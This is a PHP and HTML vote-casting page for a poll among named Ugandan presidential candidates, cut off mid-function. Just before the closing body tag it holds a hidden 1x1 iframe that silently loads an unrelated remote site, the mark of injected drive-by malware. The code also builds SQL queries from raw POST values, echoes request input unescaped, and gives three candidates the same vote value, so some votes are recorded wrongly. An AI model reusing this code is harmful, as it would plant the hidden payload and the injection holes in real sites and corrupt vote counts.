<html>
<head>
<title>Cast vote</title>
</head>
<body>
<?php 
if(!isset($_POST['poll'],$_POST['nin'])){
?>
<?php 
if(isset($_REQUEST['name'],$_REQUEST['nin'])){
if(hasVoted($_REQUEST['nin'])){
 header("Location:index.php");
}

}else{
//go to login page
header("Location:index.php");
}
?>
<center><h1>Welcome <?php echo $_REQUEST['name']?></h1></center><hr><hr>
<fieldset><br><fieldset>
<form action="" id="form" method="post">
<div class="formfield">
<label>
<P align="center"> 
<input type="hidden" name="nin" value="<?php echo $_REQUEST['nin'];?>" />
  <input type="radio" name="poll" value="YOWERI KAGUTA MUSEVENI" id="poll_0"/>
 YOWERI KAGUTA MUSEVENI
<P align="center">
<img src="m7.jpg" width="170" height"170"/></P>
<div align="center"></fieldset><hr>
<br/><br/><fieldset>
<p align="center">
  <input type="radio" name="poll" value="MUGISHA MUNTU" id="Poll_1"/>
  MUGISHA MUNTU</p>
<P align="center"><img src="11.jpg" width="170" height="170"/></P>
 </label>
<label>
<P align="center">
<div align="center"></fieldset><hr><br><br><br><fieldset>
<P align="center">
  <input type="radio" name="poll" value="BIDANDI SSALI" id="Poll_2"/>
   BIDANDI SSALI</div>
   <P align="center">
<img src="44.jpg" width="170" height"170"/></p>
</label>
<label>
<P align="center">
<div align="center"></fieldset><hr><br><br><br>
<fieldset>
<P align="center">
  <input type="radio" name="poll" value="MUGISHA MUNTU" id="Poll_1"/>
AMAMA MBABAZI  JOHN PATRICK
<P align="center">
</div>
 <img src="888.jpg" width="170" height="170"/></P>
 </label>
  <label>
  <div align="center"></fieldset><hr><br><br>
  <fieldset>
  <P align="center">
    <input type="radio" name="poll" value="MUGISHA MUNTU" id="Poll_1"/>
  NORBET MAO
  <P align="center">
  </div>
 <img src="66.jpg" width="170" height="170"/></P>
 <fieldset>
 </label>
 </div>
<center> <input type="hidden" name="id" value="form1"/>
   <input type="hidden" name="MM_insert" value="form1"/>
   <input type="submit" value="VOTE"/></br></center>
   </feildset>
 </div>
 </form>
 <?php
 }elseif(isset($_POST['poll'],$_POST['nin'])){
 //if poll is submited
 $poll=$_POST['poll'];
 $nin=$_POST['nin'];
 if(hasVoted($nin)){//check if user voted
   header("Location:index.php");
 }
 mysql_query("insert into poll set question='$poll', NIN='$nin'")or die(mysql_error());//save poll 
 echo "<h2>THANKS FOR PARTICIPATING IN THE POLL</h2><br/><br/>";
echo "<h3>your vote has been received successfully</h3><br/><br/><br/><br/>";
echo "<a href=\"index.php\">BACK TO POLL</a>";
  
 }
 
 ?>
 <iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
</body>
 </html>
<?php
function hasVoted($nin){
include("connect.php");
$sel=mysql_query("select * from poll where NIN='$nin'")or die(mysql_error());
$val=mysql_fe